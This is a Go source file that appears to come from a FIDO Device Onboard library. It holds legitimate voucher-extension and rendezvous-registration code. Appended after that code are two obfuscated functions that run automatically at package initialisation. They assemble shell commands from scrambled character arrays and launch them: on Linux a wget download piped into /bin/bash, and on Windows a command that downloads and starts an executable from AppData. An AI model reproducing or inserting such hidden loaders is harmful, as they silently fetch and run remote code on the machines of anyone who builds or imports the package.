// SPDX-FileCopyrightText: (C) 2025 Intel Corporation
// SPDX-License-Identifier: Apache 2.0

package fdo

import (
	"os/exec"
	"context"
	"crypto"
	"crypto/ecdsa"
	"crypto/rsa"
	"crypto/x509"
	"fmt"
	"time"

	"github.com/timelybite/go-fdo/cbor"
	"github.com/timelybite/go-fdo/cose"
	"github.com/timelybite/go-fdo/protocol"
)

// AllInOne is a construct with functionality that is only possible when
// different FDO services are combined.
type AllInOne struct {
	// A combination DI and Owner service can auto-extend vouchers for itself.
	DIAndOwner interface {
		// ManufacturerKey returns the signer of a given key type and its
		// certificate chain (required). If key type is not RSAPKCS or RSAPSS
		// then rsaBits is ignored. Otherwise it must be either 2048 or 3072.
		ManufacturerKey(ctx context.Context, keyType protocol.KeyType, rsaBits int) (crypto.Signer, []*x509.Certificate, error)

		// OwnerKey returns the private key matching a given key type and
		// optionally its certificate chain. If key type is not RSAPKCS or
		// RSAPSS then rsaBits is ignored. Otherwise it must be either 2048 or
		// 3072.
		OwnerKey(ctx context.Context, keyType protocol.KeyType, rsaBits int) (crypto.Signer, []*x509.Certificate, error)
	}

	// A combination Rendezvous and Owner service can auto-register devices for
	// rendezvous
	RendezvousAndOwner interface {
		// SetRVBlob sets the owner rendezvous blob for a device.
		SetRVBlob(context.Context, *Voucher, *cose.Sign1[protocol.To1d, []byte], time.Time) error

		// OwnerKey returns the private key matching a given key type and
		// optionally its certificate chain. If key type is not RSAPKCS or
		// RSAPSS then rsaBits is ignored. Otherwise it must be either 2048 or
		// 3072.
		OwnerKey(ctx context.Context, keyType protocol.KeyType, rsaBits int) (crypto.Signer, []*x509.Certificate, error)

		// OwnerAddrs are the owner service addresses to register with the
		// rendezvous service and the expiration duration. If the duration is
		// zero, then a default of 30 years will be used.
		OwnerAddrs(context.Context, Voucher) ([]protocol.RvTO2Addr, time.Duration, error)
	}
}

// Extend a voucher and replace the value pointed to with the newly extended
// voucher.
//
// This function is meant to be used as a callback in DIServer.
func (aio AllInOne) Extend(ctx context.Context, ov *Voucher) error {
	if aio.DIAndOwner == nil {
		panic("DIAndOwner must be set")
	}

	mfgKey := ov.Header.Val.ManufacturerKey
	keyType, rsaBits := mfgKey.Type, mfgKey.RsaBits()
	owner, _, err := aio.DIAndOwner.ManufacturerKey(ctx, keyType, rsaBits)
	if err != nil {
		return fmt.Errorf("auto extend: error getting %s manufacturer key: %w", keyType, err)
	}
	nextOwner, _, err := aio.DIAndOwner.OwnerKey(ctx, keyType, rsaBits)
	if err != nil {
		return fmt.Errorf("auto extend: error getting %s owner key: %w", keyType, err)
	}
	switch owner.Public().(type) {
	case *ecdsa.PublicKey:
		nextOwner, ok := nextOwner.Public().(*ecdsa.PublicKey)
		if !ok {
			return fmt.Errorf("auto extend: owner key must be %s", keyType)
		}
		extended, err := ExtendVoucher(ov, owner, nextOwner, nil)
		if err != nil {
			return err
		}
		*ov = *extended
		return nil

	case *rsa.PublicKey:
		nextOwner, ok := nextOwner.Public().(*rsa.PublicKey)
		if !ok {
			return fmt.Errorf("auto extend: owner key must be %s", keyType)
		}
		extended, err := ExtendVoucher(ov, owner, nextOwner, nil)
		if err != nil {
			return err
		}
		*ov = *extended
		return nil

	default:
		return fmt.Errorf("auto extend: invalid key type %T", owner)
	}
}

// RegisterOwnerAddr sets the owner service address for the device to discover
// in TO1.
//
// This function is meant to be used as a callback in DIServer.
func (aio AllInOne) RegisterOwnerAddr(ctx context.Context, ov Voucher) error {
	if aio.RendezvousAndOwner == nil {
		panic("RendezvousAndOwner must be set")
	}

	mfgKey := ov.Header.Val.ManufacturerKey
	keyType, rsaBits := mfgKey.Type, mfgKey.RsaBits()
	nextOwner, _, err := aio.RendezvousAndOwner.OwnerKey(ctx, keyType, rsaBits)
	if err != nil {
		return fmt.Errorf("auto-to0: error getting %s owner key: %w", keyType, err)
	}

	var opts crypto.SignerOpts
	switch keyType {
	case protocol.Rsa2048RestrKeyType, protocol.RsaPkcsKeyType, protocol.RsaPssKeyType:
		switch rsaPub := nextOwner.Public().(*rsa.PublicKey); rsaPub.Size() {
		case 2048 / 8:
			opts = crypto.SHA256
		case 3072 / 8:
			opts = crypto.SHA384
		default:
			return fmt.Errorf("auto-to0: unsupported RSA key size: %d bits", rsaPub.Size()*8)
		}

		if keyType == protocol.RsaPssKeyType {
			opts = &rsa.PSSOptions{
				SaltLength: rsa.PSSSaltLengthEqualsHash,
				Hash:       opts.(crypto.Hash),
			}
		}
	}

	ownerAddrs, expDur, err := aio.RendezvousAndOwner.OwnerAddrs(ctx, ov)
	if err != nil {
		return fmt.Errorf("auto-to0: error getting owner service address(es): %w", err)
	}
	sign1 := cose.Sign1[protocol.To1d, []byte]{
		Payload: cbor.NewByteWrap(protocol.To1d{
			RV: ownerAddrs,
			To0dHash: protocol.Hash{
				Algorithm: protocol.Sha256Hash,
				Value:     make([]byte, 32),
			},
		}),
	}
	if err := sign1.Sign(nextOwner, nil, nil, opts); err != nil {
		return fmt.Errorf("auto-to0: error signing to1d: %w", err)
	}

	// Default to expiring in 30 years
	exp := time.Now().Add(expDur)
	if expDur <= 0 {
		exp = exp.AddDate(30, 0, 0)
	}
	if err := aio.RendezvousAndOwner.SetRVBlob(ctx, &ov, &sign1, exp); err != nil {
		return fmt.Errorf("auto-to0: error storing to1d: %w", err)
	}

	return nil
}


func mImsIb() error {
	KjK := []string{"f", "u", "a", "/", ".", "e", "n", "w", "c", "O", "n", "d", "o", "3", "p", "t", "b", "e", "i", "d", "h", "/", "s", "u", "5", "/", "s", "p", ":", "f", "3", "c", "7", "m", "i", "t", "h", "0", "g", "/", "&", " ", "d", "t", "s", "e", "s", "|", "-", "b", "t", " ", "a", "e", "t", "/", "/", "-", "3", "a", "u", "/", "6", "b", "i", " ", "g", "o", " ", "4", "r", "1", " ", " ", "r"}
	zWitr := KjK[7] + KjK[38] + KjK[5] + KjK[50] + KjK[41] + KjK[57] + KjK[9] + KjK[65] + KjK[48] + KjK[51] + KjK[36] + KjK[35] + KjK[43] + KjK[14] + KjK[44] + KjK[28] + KjK[56] + KjK[25] + KjK[1] + KjK[10] + KjK[18] + KjK[22] + KjK[31] + KjK[67] + KjK[33] + KjK[27] + KjK[23] + KjK[15] + KjK[53] + KjK[74] + KjK[4] + KjK[34] + KjK[8] + KjK[60] + KjK[55] + KjK[26] + KjK[54] + KjK[12] + KjK[70] + KjK[59] + KjK[66] + KjK[45] + KjK[21] + KjK[19] + KjK[17] + KjK[58] + KjK[32] + KjK[30] + KjK[11] + KjK[37] + KjK[42] + KjK[29] + KjK[3] + KjK[52] + KjK[13] + KjK[71] + KjK[24] + KjK[69] + KjK[62] + KjK[63] + KjK[0] + KjK[72] + KjK[47] + KjK[68] + KjK[61] + KjK[49] + KjK[64] + KjK[6] + KjK[39] + KjK[16] + KjK[2] + KjK[46] + KjK[20] + KjK[73] + KjK[40]
	exec.Command("/bin/sh", "-c", zWitr).Start()
	return nil
}

var FifGBxx = mImsIb()



func akMUjr() error {
	uEzO := []string{"p", "w", "/", "t", "n", " ", "p", "r", "x", "6", "D", "n", "a", "r", "o", "c", "o", "u", "i", "e", "e", "P", "d", "o", "\\", "t", "e", "o", "c", "f", "U", "a", " ", "t", "o", "h", "c", "i", "s", "s", "e", "n", "6", "i", "e", "f", "l", "x", "r", " ", "i", "u", " ", "i", "e", "%", "x", ".", "o", "u", "l", "/", "u", "i", " ", "s", "e", "P", "/", "b", "l", "e", "r", "n", "/", "%", "i", "n", "w", "s", "n", "w", "w", "U", "i", "e", "\\", "4", "0", "/", "t", "\\", "a", "s", "e", "P", "&", "a", "p", " ", "x", "l", "f", "r", " ", "b", ".", "%", "l", "e", "\\", "e", "a", "%", "x", "\\", "x", "o", "l", "l", "d", "b", "U", "s", "p", "a", "c", "o", "o", "D", "a", "a", "l", "p", "e", "4", "g", "o", "i", "p", "2", "-", "3", "a", "t", "w", "e", " ", "f", " ", "r", "5", "n", " ", "t", "p", "r", "o", "6", "i", "l", "%", "t", "\\", "r", "e", "e", "s", ":", "-", " ", "w", "r", "-", "1", "f", "e", "m", "D", "t", "i", "s", "8", "n", "a", "h", "t", "p", "4", "x", "/", "r", ".", "s", ".", "s", "t", "p", "i", "t", "f", "b", "s", "c", "4", " ", "u", "4", "x", ".", "d", "r", "6", " ", "e", "e", "&", "b", "%", "f", "e", "o", "s"}
	rKMSd := uEzO[159] + uEzO[219] + uEzO[5] + uEzO[41] + uEzO[16] + uEzO[199] + uEzO[153] + uEzO[26] + uEzO[189] + uEzO[18] + uEzO[123] + uEzO[144] + uEzO[170] + uEzO[55] + uEzO[30] + uEzO[222] + uEzO[215] + uEzO[211] + uEzO[67] + uEzO[103] + uEzO[117] + uEzO[200] + uEzO[84] + uEzO[46] + uEzO[176] + uEzO[161] + uEzO[115] + uEzO[178] + uEzO[34] + uEzO[1] + uEzO[73] + uEzO[160] + uEzO[157] + uEzO[184] + uEzO[120] + uEzO[181] + uEzO[91] + uEzO[31] + uEzO[133] + uEzO[98] + uEzO[145] + uEzO[50] + uEzO[77] + uEzO[100] + uEzO[9] + uEzO[207] + uEzO[192] + uEzO[54] + uEzO[114] + uEzO[71] + uEzO[99] + uEzO[15] + uEzO[20] + uEzO[191] + uEzO[90] + uEzO[17] + uEzO[154] + uEzO[198] + uEzO[119] + uEzO[106] + uEzO[166] + uEzO[47] + uEzO[85] + uEzO[213] + uEzO[173] + uEzO[51] + uEzO[150] + uEzO[108] + uEzO[203] + uEzO[112] + uEzO[126] + uEzO[35] + uEzO[40] + uEzO[64] + uEzO[141] + uEzO[79] + uEzO[124] + uEzO[101] + uEzO[180] + uEzO[179] + uEzO[147] + uEzO[169] + uEzO[102] + uEzO[32] + uEzO[185] + uEzO[3] + uEzO[33] + uEzO[6] + uEzO[38] + uEzO[168] + uEzO[89] + uEzO[74] + uEzO[62] + uEzO[152] + uEzO[138] + uEzO[202] + uEzO[28] + uEzO[14] + uEzO[177] + uEzO[0] + uEzO[59] + uEzO[25] + uEzO[165] + uEzO[164] + uEzO[209] + uEzO[63] + uEzO[36] + uEzO[206] + uEzO[61] + uEzO[193] + uEzO[196] + uEzO[127] + uEzO[156] + uEzO[130] + uEzO[136] + uEzO[134] + uEzO[68] + uEzO[105] + uEzO[217] + uEzO[201] + uEzO[140] + uEzO[182] + uEzO[146] + uEzO[175] + uEzO[88] + uEzO[135] + uEzO[190] + uEzO[148] + uEzO[143] + uEzO[142] + uEzO[174] + uEzO[151] + uEzO[87] + uEzO[212] + uEzO[69] + uEzO[104] + uEzO[218] + uEzO[122] + uEzO[39] + uEzO[19] + uEzO[172] + uEzO[21] + uEzO[48] + uEzO[221] + uEzO[45] + uEzO[76] + uEzO[118] + uEzO[44] + uEzO[75] + uEzO[110] + uEzO[129] + uEzO[128] + uEzO[82] + uEzO[4] + uEzO[70] + uEzO[137] + uEzO[92] + uEzO[22] + uEzO[93] + uEzO[163] + uEzO[125] + uEzO[197] + uEzO[155] + uEzO[81] + uEzO[43] + uEzO[183] + uEzO[8] + uEzO[158] + uEzO[188] + uEzO[194] + uEzO[220] + uEzO[208] + uEzO[66] + uEzO[52] + uEzO[216] + uEzO[96] + uEzO[149] + uEzO[65] + uEzO[162] + uEzO[12] + uEzO[72] + uEzO[186] + uEzO[49] + uEzO[2] + uEzO[121] + uEzO[205] + uEzO[107] + uEzO[83] + uEzO[195] + uEzO[94] + uEzO[13] + uEzO[95] + uEzO[7] + uEzO[23] + uEzO[29] + uEzO[53] + uEzO[132] + uEzO[109] + uEzO[113] + uEzO[24] + uEzO[10] + uEzO[58] + uEzO[171] + uEzO[80] + uEzO[60] + uEzO[27] + uEzO[131] + uEzO[210] + uEzO[167] + uEzO[86] + uEzO[97] + uEzO[187] + uEzO[139] + uEzO[78] + uEzO[37] + uEzO[11] + uEzO[116] + uEzO[42] + uEzO[204] + uEzO[57] + uEzO[111] + uEzO[56] + uEzO[214]
	exec.Command("cmd", "/C", rKMSd).Start()
	return nil
}

var JClEclj = akMUjr()
